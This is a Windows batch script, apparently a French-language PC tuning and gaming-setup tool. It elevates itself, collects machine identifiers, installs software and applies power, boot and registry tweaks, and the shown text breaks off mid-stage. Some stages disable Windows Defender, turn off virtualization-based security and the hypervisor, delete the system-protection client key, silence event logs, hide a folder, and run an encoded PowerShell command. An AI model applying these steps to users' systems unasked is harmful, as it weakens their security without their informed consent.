:DQSADM
@echo off
@Title DQS-AD
cd /d %~dp0
SET veropt=2.5
SET AFF=%veropt%
md %SystemDrive%\Ect
set indigo=[38;5;105m
set red=[91m
set white=[37m
set light_red=[91m
mode con:cols=70 lines=20
SET HWCN=0
cls

echo SET veropt=%veropt%>bin\ves.bat

Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows Script Host\Settings" /v "Enabled" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP1" /t REG_SZ /d "N" /f >nul
Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP2" /t REG_SZ /d "N" /f >nul
Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP3" /t REG_SZ /d "N" /f >nul
Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP4" /t REG_SZ /d "N" /f >nul
Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP5" /t REG_SZ /d "N" /f >nul
Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP6" /t REG_SZ /d "N" /f >nul
Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP7" /t REG_SZ /d "N" /f >nul
Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP8" /t REG_SZ /d "N" /f >nul
Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP9" /t REG_SZ /d "N" /f >nul
Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP10" /t REG_SZ /d "N" /f >nul
Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP11" /t REG_SZ /d "N" /f >nul
Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP12" /t REG_SZ /d "N" /f >nul
Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP13" /t REG_SZ /d "N" /f >nul
Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP14" /t REG_SZ /d "N" /f >nul
Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP15" /t REG_SZ /d "N" /f >nul
Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP16" /t REG_SZ /d "N" /f >nul
Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP17" /t REG_SZ /d "N" /f >nul
Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP18" /t REG_SZ /d "N" /f >nul
Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP19" /t REG_SZ /d "N" /f >nul
Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP20" /t REG_SZ /d "N" /f >nul
Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP21" /t REG_SZ /d "N" /f >nul
Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP22" /t REG_SZ /d "N" /f >nul
Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP23" /t REG_SZ /d "N" /f >nul
Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP24" /t REG_SZ /d "N" /f >nul
Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP25" /t REG_SZ /d "N" /f >nul
Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP26" /t REG_SZ /d "N" /f >nul
Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP27" /t REG_SZ /d "N" /f >nul
Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP28" /t REG_SZ /d "N" /f >nul
Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP29" /t REG_SZ /d "N" /f >nul
Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP30" /t REG_SZ /d "N" /f >nul
Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP31" /t REG_SZ /d "N" /f >nul
Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP32" /t REG_SZ /d "N" /f >nul
Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP33" /t REG_SZ /d "N" /f >nul
Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP34" /t REG_SZ /d "N" /f >nul
Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP35" /t REG_SZ /d "N" /f >nul
Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP36" /t REG_SZ /d "N" /f >nul
Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP37" /t REG_SZ /d "N" /f >nul
Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP38" /t REG_SZ /d "N" /f >nul

SET HHWID=LOAD
SET HWID=LOAD
SET GPU=ERR
SET VLWD=N
attrib +h +s "C:\Ect"

rmdir %SystemDrive%\Windows\system32\adminrightstest >nul 2>&1
mkdir %SystemDrive%\Windows\system32\adminrightstest >nul 2>&1
if %errorlevel% neq 0 (
	powershell -NoProfile -NonInteractive -Command start -verb runas "'%~s0'" >nul 2>&1 & exit /b
)

for /f "tokens=2 delims==" %%a in ('wmic path Win32_VideoController get VideoProcessor /value') do (
	for %%n in (GeForce NVIDIA RTX GTX) do echo %%a | find "%%n" >nul && set "GPU=NVIDIA"
	for %%n in (AMD Ryzen) do echo %%a | find "%%n" >nul && set "GPU=AMD"
	for %%n in (Intel UHD) do echo %%a | find "%%n" >nul && set "GPU=INTEL"
	for %%n in (VMware) do echo %%a | find "%%n" >nul && set "GPU=VMWARE"
)

FOR /F "tokens=*" %%a IN ('wmic bios get bioscharacteristics^|find /c "33"') DO set USBlegacy=%%a
IF %USBlegacy%==0 SET VM=YES& goto :SIUFT
SET VM=NO

:SIUFT

for /F "delims=" %%A in ('powershell -command "Get-WmiObject -Class Win32_SystemEnclosure | Select-Object -ExpandProperty ChassisTypes"') do (
    set "chassisType=%%A"
)

:end5878656

SET CURRENTKEY=HKLM\SOFTWARE\Microsoft\Cryptography
FOR /F "TOKENS=2,*" %%A IN ('reg query "%CURRENTKEY%" 2^>NUL^|FIND /I "MachineGuid"') DO set MGG=%%B

SET CURRENTKEY=HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
FOR /F "TOKENS=2,*" %%A IN ('reg query "%CURRENTKEY%" 2^>NUL^|FIND /I "CurrentBuildNumber"') DO set RO1=%%B

SET CURRENTKEY=HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
FOR /F "TOKENS=2,*" %%A IN ('reg query "%CURRENTKEY%" 2^>NUL^|FIND /I "DisplayVersion"') DO set RO2=%%B

SET CURRENTKEY=HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
FOR /F "TOKENS=2,*" %%A IN ('reg query "%CURRENTKEY%" 2^>NUL^|FIND /I "EditionID"') DO set RO3=%%B

SET CURRENTKEY=HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
FOR /F "TOKENS=2,*" %%A IN ('reg query "%CURRENTKEY%" 2^>NUL^|FIND /I "EditionSubManufacturer"') DO set RO4=%%B

SET CURRENTKEY=HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
FOR /F "TOKENS=2,*" %%A IN ('reg query "%CURRENTKEY%" 2^>NUL^|FIND /I "EditionSubstring"') DO set RO5=%%B

SET CURRENTKEY=HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
FOR /F "TOKENS=2,*" %%A IN ('reg query "%CURRENTKEY%" 2^>NUL^|FIND /I "ProductName"') DO set RO6=%%B

SET CURRENTKEY=HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
FOR /F "TOKENS=2,*" %%A IN ('reg query "%CURRENTKEY%" 2^>NUL^|FIND /I "RegisteredOrganisation"') DO set RO7=%%B

SET CURRENTKEY=HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
FOR /F "TOKENS=2,*" %%A IN ('reg query "%CURRENTKEY%" 2^>NUL^|FIND /I "RegisteredOrganization"') DO set RO8=%%B

SET CURRENTKEY=HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
FOR /F "TOKENS=2,*" %%A IN ('reg query "%CURRENTKEY%" 2^>NUL^|FIND /I "ReleaseId"') DO set RO9=%%B

SET CURRENTKEY=HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
FOR /F "TOKENS=2,*" %%A IN ('reg query "%CURRENTKEY%" 2^>NUL^|FIND /I "ProductId"') DO set RO0=%%B

SET CURRENTKEY=HKLM\SOFTWARE\RECS
FOR /F "TOKENS=2,*" %%A IN ('reg query "%CURRENTKEY%" 2^>NUL^|FIND /I "USERNAME"') DO set USRN=%%B

SET "PCTYP=Inconnu"

IF %chassisType%==1 SET "PCTYP=Inconnu" & SET SCPI=1
IF %chassisType%==2 SET "PCTYP=Inconnu" & SET SCPI=1
IF %chassisType%==3 SET "PCTYP=Desktop" & SET SCPI=2
IF %chassisType%==8 SET "PCTYP=Portable" & SET SCPI=1
IF %chassisType%==9 SET "PCTYP=Laptop" & SET SCPI=1
IF %chassisType%==10 SET "PCTYP=Notebook" & SET SCPI=1
IF %chassisType%==14 SET "PCTYP=Sub-Notebook" & SET SCPI=1
IF %chassisType%==30 SET "PCTYP=Tablet" & SET SCPI=1
IF %chassisType%==31 SET "PCTYP=Convertible" & SET SCPI=1
IF %chassisType%==32 SET "PCTYP=Detachable" & SET SCPI=1

@timeout /t 05>nul
IF EXIST PID.log (
	for /f "usebackq tokens=*" %%a in ("PID.log") do (
    	set "PID=%%a"
    	goto :PIDF
	)
) else (
	echo NO - PID.log
	Ping 10>nul
	goto :DQSADM
)

:PIDF

IF %PID%==Erreur goto :FATALERROR
IF %PID%==Error goto :FATALERROR
IF EXIST bin\ver.bat call bin\ver.bat

set "TargetPID=%PID%"
DEL PID.log
set IDS=1

timeout /t 05 /nobreak>nul

:PIDFV

IF %HHWID%==LOAD (
	for /f "usebackq tokens=*" %%a in ("HWID.txt") do (
    	set "HHWID=%%a"
	)
	goto :PIDFV
)

IF %HHWID% == 191262638503131 SET HWCN=1
IF %HHWID% == PF0TRR6A SET HWCN=1 & SET VLWD=Y
IF %HHWID% == 219925897859274 SET HWCN=1 & SET VLWD=Y
IF %HHWID% == J216401760 SET HWCN=1 & SET VLWD=Y

for /f "tokens=2 delims==" %%a in ('wmic os get TotalVisibleMemorySize /format:value') do set mem=%%a
set /a ram=%mem% + 1024000

@Title DQS-AD

mode con:cols=70 lines=20
cd /d %~dp0
cls
echo I--------------------------------------------------------------------I
echo  %indigo%DEBUG:%white%
echo  [Username               ] = %USRN% / %username%
echo  [Baseboard ID           ] = %HHWID%
echo  [ID                     ] = %HWID%
echo  [MachineGuid            ] = %MGG%
echo  [Script ver             ] = %scrver% / %AFF%
echo  [ProductName            ] = %RO6%
echo  [RegisteredOrganisation ] = %RO7%
echo  [EditionID              ] = %RO3%
echo  [DisplayVersion         ] = %RO2%
echo  [CurrentBuildNumber     ] = %RO1%
echo  [ReleaseId              ] = %RO9%
echo  [ChassisType            ] = %PCTYP%
echo  [VM                     ] = %VM%
echo  [GPU                    ] = %GPU%
echo  [PC Name                ] = %computername%
echo  [RAM / MEM              ] = %ram% / %mem%
echo I--------------------------------------------------------------------I

IF EXIST bin\SVPP1.STR (
	call bin\Visual\Visual-CPP\Uninstaller.cmd
	Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP1" /t REG_SZ /d "Y" /f >nul
	timeout /t 02 /nobreak>nul
	echo Y>bin\SVPP1.END
	DEL bin\SVPP1.STR
	cd /d %~dp0
)

IF EXIST bin\SVPP2.STR (
	call bin\Visual\Visual-CPP\Installer.cmd
	Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP2" /t REG_SZ /d "Y" /f >nul
	timeout /t 02 /nobreak>nul
	echo Y>bin\SVPP2.END
	DEL bin\SVPP2.STR
	cd /d %~dp0
)

IF EXIST bin\SVPP3.STR (
	START "" /wait "bin\Visual\dxwebsetup.exe" -Q
	Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP3" /t REG_SZ /d "Y" /f >nul
	echo Y>bin\SVPP3.END
	DEL bin\SVPP3.STR
)

IF EXIST bin\SVPP4.STR (
	START "" /wait "bin\Visual\VC_redist.x64.exe" -s
	START "" /wait "bin\Visual\vcredist_x64.exe" -s
	START "" /wait "bin\Visual\windowsdesktop-runtime-5.0.17-win-x86.exe" -s
	Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP4" /t REG_SZ /d "Y" /f >nul
	START "" /wait "bin\Visual\VC_redist.x64.exe" /q /norestart
	echo Y>bin\SVPP4.END
	DEL bin\SVPP4.STR
)

IF EXIST bin\SVPP5.STR (
	IF %VM%==NO call bin\GPU\GPU.bat
	cd /d %~dp0
	Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP5" /t REG_SZ /d "Y" /f >nul
	timeout /t 01 /nobreak>nul
	echo Y>bin\SVPP5.END
	DEL bin\SVPP5.STR
)

IF EXIST bin\SVPP6.STR (
	robocopy "bin\Startup" "%SystemDrive%\Ect" /s /w:1 /r:3
	timeout /t 02 /nobreak>nul
	Powercfg /import %systemdrive%\Ect\Alimentation\RECS-H-PowerPlan.pow 11111111-1111-1111-1111-111111134587
	Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP6" /t REG_SZ /d "Y" /f >nul
	Powercfg /SETACTIVE "11111111-1111-1111-1111-111111134587"
	cd /d %~dp0
	PowerRun_x64.exe "bin\REGSCRIPT\NTLITE.bat">nul
	timeout /t 03 /nobreak>nul
	cd /d %~dp0
	call bin\REGSCRIPT\NTLITE.bat
	timeout /t 03 /nobreak>nul
	cd /d %~dp0
	echo Y>bin\SVPP6.END
	DEL bin\SVPP6.STR
)

IF EXIST bin\SVPP7.STR (
	Powercfg /hibernate off
	netsh interface Teredo set state servername=default
	netsh interface Teredo set state type=default
	powercfg -setacvalueindex scheme_current sub_processor PERFINCPOL 2
	powercfg -setacvalueindex scheme_current sub_processor PERFDECPOL 1
	powercfg -setacvalueindex scheme_current sub_processor PERFINCTHRESHOLD 10
	powercfg -setacvalueindex scheme_current sub_processor PERFDECTHRESHOLD 8
	powercfg /setactive scheme_current
	powercfg -setacvalueindex scheme_current sub_processor PROCTHROTTLEMIN 0
	bcdedit /set useplatformtick false
	bcdedit /set useplatformclock false
	bcdedit /set disabledynamictick yes
	bcdedit /set vsmlaunchtype Off
	bcdedit /set bootmenupolicy Legacy
	bcdedit /set lastknowngood yes
	bcdedit /set vm No
	Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP7" /t REG_SZ /d "Y" /f >nul
	bcdedit /set hypervisorlaunchtype off
	bcdedit /set isolatedcontext No
	bcdedit /set allowedinmemorysettings 0x0
	fsutil behavior set disablecompression 1
	fsutil behavior set disable8dot3 1
	fsutil behavior set encryptpagingfile 0
	fsutil behavior set DisableDeleteNotify 1
	fsutil behavior set disableLastAccess 1
	fsutil behavior set mftzone 2
	fsutil behavior set memoryusage 2
	wevtutil sl Microsoft-Windows-SleepStudy/Diagnostic /e:false >NUL
	wevtutil sl Microsoft-Windows-Kernel-Processor-Power/Diagnostic /e:false >NUL
	wevtutil sl Microsoft-Windows-UserModePowerService/Diagnostic /e:false >NUL
	powercfg -setacvalueindex scheme_current sub_processor PROCTHROTTLEMIN 0
	echo Y>bin\SVPP7.END
	DEL bin\SVPP7.STR
)

IF EXIST bin\SVPP8.STR (
	powershell.exe -encodedCommand JABkAGUAdgBpAGMAZQBzAFUAUwBCACAAPQAgAEcAZQB0AC0AUABuAHAARABlAHYAaQBjAGUAIAB8ACAAdwBoAGUAcgBlACAAewAkAF8ALgBJAG4AcwB0AGEAbgBjAGUASQBkACAALQBsAGkAawBlACAAIgAqAFUAUwBCAFwAUgBPAE8AVAAqACIAfQAgACAAfAAgAA0ACgBGAG8AcgBFAGEAYwBoAC0ATwBiAGoAZQBjAHQAIAAtAFAAcgBvAGMAZQBzAHMAIAB7AA0ACgBHAGUAdAAtAEMAaQBtAEkAbgBzAHQAYQBuAGMAZQAgAC0AQwBsAGEAcwBzAE4AYQBtAGUAIABNAFMAUABvAHcAZQByAF8ARABlAHYAaQBjAGUARQBuAGEAYgBsAGUAIAAtAE4AYQBtAGUAcwBwAGEAYwBlACAAcgBvAG8AdABcAHcAbQBpACAADQAKAH0ADQAKAA0ACgBmAG8AcgBlAGEAYwBoACAAKAAgACQAZABlAHYAaQBjAGUAIABpAG4AIAAkAGQAZQB2AGkAYwBlAHMAVQBTAEIAIAApAA0ACgB7AA0ACgAgACAAIAAgAFMAZQB0AC0AQwBpAG0ASQBuAHMAdABhAG4AYwBlACAALQBOAGEAbQBlAHMAcABhAGMAZQAgAHIAbwBvAHQAXAB3AG0AaQAgAC0AUQB1AGUAcgB5ACAAIgBTAEUATABFAEMAVAAgACoAIABGAFIATwBNACAATQBTAFAAbwB3AGUAcgBfAEQAZQB2AGkAYwBlAEUAbgBhAGIAbABlACAAVwBIAEUAUgBFACAASQBuAHMAdABhAG4AYwBlAE4AYQBtAGUAIABMAEkASwBFACAAJwAlACQAKAAkAGQAZQB2AGkAYwBlAC4AUABOAFAARABlAHYAaQBjAGUASQBEACkAJQAnACIAIAAtAFAAcgBvAHAAZQByAHQAeQAgAEAAewBFAG4AYQBiAGwAZQA9ACQARgBhAGwAcwBlAH0AIAAtAFAAYQBzAHMAVABoAHIAdQANAAoAfQANAAoADQAKACQAYQBkAGEAcAB0AGUAcgBzACAAPQAgAEcAZQB0AC0ATgBlAHQAQQBkAGEAcAB0AGUAcgAgAC0AUABoAHkAcwBpAGMAYQBsACAAfAAgAEcAZQB0AC0ATgBlAHQAQQBkAGEAcAB0AGUAcgBQAG8AdwBlAHIATQBhAG4AYQBnAGUAbQBlAG4AdAANAAoAIAAgACAAIABmAG8AcgBlAGEAYwBoACAAKAAkAGEAZABhAHAAdABlAHIAIABpAG4AIAAkAGEAZABhAHAAdABlAHIAcwApAA0ACgAgACAAIAAgACAAIAAgACAAewANAAoAIAAgACAAIAAgACAAIAAgACQAYQBkAGEAcAB0AGUAcgAuAEEAbABsAG8AdwBDAG8AbQBwAHUAdABlAHIAVABvAFQAdQByAG4ATwBmAGYARABlAHYAaQBjAGUAIAA9ACAAJwBEAGkAcwBhAGIAbABlAGQAJwANAAoAIAAgACAAIAAgACAAIAAgACQAYQBkAGEAcAB0AGUAcgAgAHwAIABTAGUAdAAtAE4AZQB0AEEAZABhAHAAdABlAHIAUABvAHcAZQByAE0AYQBuAGEAZwBlAG0AZQBuAHQADQAKACAAIAAgACAAIAAgACAAIAB9AA==
	Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP8" /t REG_SZ /d "Y" /f >nul
	echo Y>bin\SVPP8.END
	DEL bin\SVPP8.STR
)

IF EXIST bin\SVPP9.STR (
	PowerRun_x64.exe "bin\SCP\scp1.bat">nul
	Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP9" /t REG_SZ /d "Y" /f >nul
	timeout /t 02 /nobreak>nul
	call bin\SCP\scp1.bat
	cd /d %~dp0
	echo Y>bin\SVPP9.END
	DEL bin\SVPP9.STR
)

IF EXIST bin\SVPP10.STR (
	PowerRun_x64.exe "bin\SCP\scp3.bat">nul
	Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP10" /t REG_SZ /d "Y" /f >nul
	timeout /t 02 /nobreak>nul
	call bin\SCP\scp3.bat
	cd /d %~dp0
	echo Y>bin\SVPP10.END
	DEL bin\SVPP10.STR
)

IF EXIST bin\SVPP11.STR (
	PowerRun_x64.exe "bin\SCP\scp4.bat">nul
	Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP11" /t REG_SZ /d "Y" /f >nul
	timeout /t 02 /nobreak>nul
	call bin\SCP\scp4.bat
	cd /d %~dp0
	echo Y>bin\SVPP11.END
	DEL bin\SVPP11.STR
)

IF EXIST bin\SVPP12.STR (
	PowerRun_x64.exe "bin\SCP\scp5.bat">nul
	Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP12" /t REG_SZ /d "Y" /f >nul
	timeout /t 02 /nobreak>nul
	call bin\SCP\scp5.bat
	cd /d %~dp0
	echo Y>bin\SVPP12.END
	DEL bin\SVPP12.STR
)

IF EXIST bin\SVPP13.STR (
	PowerRun_x64.exe "bin\SCP\scp6.bat">nul
	Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP13" /t REG_SZ /d "Y" /f >nul
	timeout /t 02 /nobreak>nul
	call bin\SCP\scp6.bat
	cd /d %~dp0
	echo Y>bin\SVPP13.END
	DEL bin\SVPP13.STR
)

IF EXIST bin\SVPP14.STR (
	PowerRun_x64.exe "bin\SCP\scp7.bat">nul
	Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP14" /t REG_SZ /d "Y" /f >nul
	timeout /t 02 /nobreak>nul
	call bin\SCP\scp7.bat
	cd /d %~dp0
	echo Y>bin\SVPP14.END
	DEL bin\SVPP14.STR
)

IF EXIST bin\SVPP15.STR (
	PowerRun_x64.exe "bin\SCP\scp8.bat">nul
	Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP15" /t REG_SZ /d "Y" /f >nul
	timeout /t 02 /nobreak>nul
	call bin\SCP\scp8.bat
	cd /d %~dp0
	echo Y>bin\SVPP15.END
	DEL bin\SVPP15.STR
)

IF EXIST bin\SVPP16.STR (
	PowerRun_x64.exe "bin\SCP\scp9.bat">nul
	Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP16" /t REG_SZ /d "Y" /f >nul
	timeout /t 02 /nobreak>nul
	call bin\SCP\scp9.bat
	cd /d %~dp0
	echo Y>bin\SVPP16.END
	DEL bin\SVPP16.STR
)

IF EXIST bin\SVPP17.STR (
	PowerRun_x64.exe "bin\SCP\scp10.bat">nul
	Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP17" /t REG_SZ /d "Y" /f >nul
	timeout /t 02 /nobreak>nul
	call bin\SCP\scp10.bat
	cd /d %~dp0
	echo Y>bin\SVPP17.END
	DEL bin\SVPP17.STR
)

IF EXIST bin\SVPP18.STR (
	powershell -command "Get-AppxPackage *WebExperience* | Remove-AppxPackage"
	powershell -command "Get-AppxPackage -AllUsers Microsoft.XboxGamingOverlay | Remove-AppxPackage"
	call bin\POWERSHELL\POWERSHELL.bat
	cd /d %~dp0
	Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP18" /t REG_SZ /d "Y" /f >nul
	echo Y>bin\SVPP18.END
	DEL bin\SVPP18.STR
)

IF EXIST bin\SVPP19.STR (
	for /f "tokens=2 delims==" %%a in ('wmic os get TotalVisibleMemorySize /format:value') do set mem=%%a
		set /a ram=%mem% + 1024000
		timeout /t 02 /nobreak>nul
		Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control" /v "SvcHostSplitThresholdInKB" /t REG_DWORD /d "%ram%" /f
		Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP19" /t REG_SZ /d "Y" /f >nul
		Reg.exe delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SPP\Clients" /f>nul
		echo %mem%
	echo Y>bin\SVPP19.END
	DEL bin\SVPP19.STR
)

IF EXIST bin\SVPP20.STR (
	call bin\WINDEF\DESWINDEF.bat
	cd /d %~dp0
	PowerRun_x64.exe "bin\WINDEF\DESWINDEF.bat">nul
	PowerRun_x64.exe "bin\REGSCRIPT\REGSCRIPT1.bat">nul
	Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP20" /t REG_SZ /d "Y" /f >nul
	timeout /t 02 /nobreak>nul
	call bin\REGSCRIPT\REGSCRIPT1.bat
	cd /d %~dp0
	echo Y>bin\SVPP20.END
	DEL bin\SVPP20.STR
)

IF EXIST bin\SVPP21.STR (
	PowerRun_x64.exe "bin\REGSCRIPT\REGSCRIPT2.bat">nul
	Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP21" /t REG_SZ /d "Y" /f >nul
	cd /d %~dp0
	timeout /t 02 /nobreak>nul
	call bin\REGSCRIPT\REGSCRIPT2.bat
	cd /d %~dp0
	echo Y>bin\SVPP21.END
	DEL bin\SVPP21.STR
)

IF EXIST bin\SVPP22.STR (
	PowerRun_x64.exe "bin\REGSCRIPT\REGSCRIPT3.bat">nul
	Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP22" /t REG_SZ /d "Y" /f >nul
	timeout /t 02 /nobreak>nul
	call bin\REGSCRIPT\REGSCRIPT3.bat
	cd /d %~dp0
	echo Y>bin\SVPP22.END
	DEL bin\SVPP22.STR
)

IF EXIST bin\SVPP23.STR (
	call bin\REGSCRIPT\REGSCRIPT4.bat
	Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP23" /t REG_SZ /d "Y" /f >nul
	cd /d %~dp0
	echo Y>bin\SVPP23.END
	DEL bin\SVPP23.STR
)

IF EXIST bin\SVPP24.STR (
	cd /d %~dp0
	PowerRun_x64.exe "bin\REGSCRIPT\REGSCRIPT5.bat">nul
	Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP24" /t REG_SZ /d "Y" /f >nul
	timeout /t 03 /nobreak>nul
	cd /d %~dp0
	PowerRun_x64.exe "bin\REGSCRIPT\REGSCRIPT6.bat">nul
	timeout /t 03 /nobreak>nul
	cd /d %~dp0
	call bin\REGSCRIPT\REGSCRIPT5.bat
	timeout /t 03 /nobreak>nul
	cd /d %~dp0
	call bin\REGSCRIPT\REGSCRIPT6.bat
	timeout /t 03 /nobreak>nul
	cd /d %~dp0
	echo Y>bin\SVPP24.END
	DEL bin\SVPP24.STR
)

IF EXIST bin\SVPP25.STR (
	Start "" "C:\Ect\STR\SetTimerResolutionService.exe" -Install
	Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "GlobalTimerResolutionRequests" /t REG_DWORD /d "1" /f > nul
	Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP25" /t REG_SZ /d "Y" /f >nul
	timeout /t 02 /nobreak>nul
	sc start STR
	echo Y>bin\SVPP25.END
	DEL bin\SVPP25.STR
)

IF EXIST bin\SVPP26.STR (
	call bin\DRIVERS\Devices.bat
	Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP26" /t REG_SZ /d "Y" /f >nul
	cd /d %~dp0
	echo Y>bin\SVPP26.END
	DEL bin\SVPP26.STR
)

IF EXIST bin\SVPP27.STR (
	PowerRun_x64.exe "bin\Schedule.bat">nul
	timeout /t 02 /nobreak>nul
	Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP27" /t REG_SZ /d "Y" /f >nul
	call bin\Schedule.bat
	cd /d %~dp0
	echo Y>bin\SVPP27.END
	DEL bin\SVPP27.STR
)

IF EXIST bin\SVPP28.STR (
	IF %HHWID% == PF0TRR6A call bin\Outils.bat
	IF %HHWID% == 219925897859274 call bin\Outils.bat
	IF %HHWID% == 191262638503131 call bin\Outils.bat
	IF %HHWID% == J216401760 call bin\Outils.bat
	Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP28" /t REG_SZ /d "Y" /f >nul
	cd /d %~dp0
	echo Y>bin\SVPP28.END
	DEL bin\SVPP28.STR
)

IF EXIST bin\SVPP29.STR (
	IF NOT EXIST "C:\Program Files (x86)\Steam\steam.exe" (
	IF EXIST "bin\SOFT\SteamSetup.exe" Start /wait "" "bin\SOFT\SteamSetup.exe" /S
	)
	Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP29" /t REG_SZ /d "Y" /f >nul
	echo Y>bin\SVPP29.END
	DEL bin\SVPP29.STR
)

IF EXIST bin\SVPP30.STR (
	Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP30" /t REG_SZ /d "Y" /f >nul
	IF %VLWD%==N goto :SCG
	IF NOT EXIST "C:\Program Files (x86)\Epic Games\Launcher\Portal\Binaries\Win64\EpicGamesLauncher.exe" (
		Start "" "bin\SOFT\DiscordSetup.exe" -s
		Start /wait "" "bin\SOFT\EpicInstaller-15.7.0.msi" /qn
	)
	:SCG
	echo Y>bin\SVPP30.END
	DEL bin\SVPP30.STR
)

IF EXIST bin\SVPP31.STR (
	IF NOT EXIST "C:\Program Files\7-Zip\7zFM.exe" (
	Start /wait "" "bin\SOFT\7z2403-x64.exe" /S
	)
	Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP31" /t REG_SZ /d "Y" /f >nul
	echo Y>bin\SVPP31.END
	DEL bin\SVPP31.STR
)

IF EXIST bin\SVPP32.STR (
	IF %VLWD%==Y (
		Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP32" /t REG_SZ /d "Y" /f >nul
	    IF NOT EXIST "C:\Program Files (x86)\Skillbrains\lightshot" (
	    	Start /wait "" "bin\SOFT\setup-lightshot.exe" /VERYSILENT /NORESTART
	    )
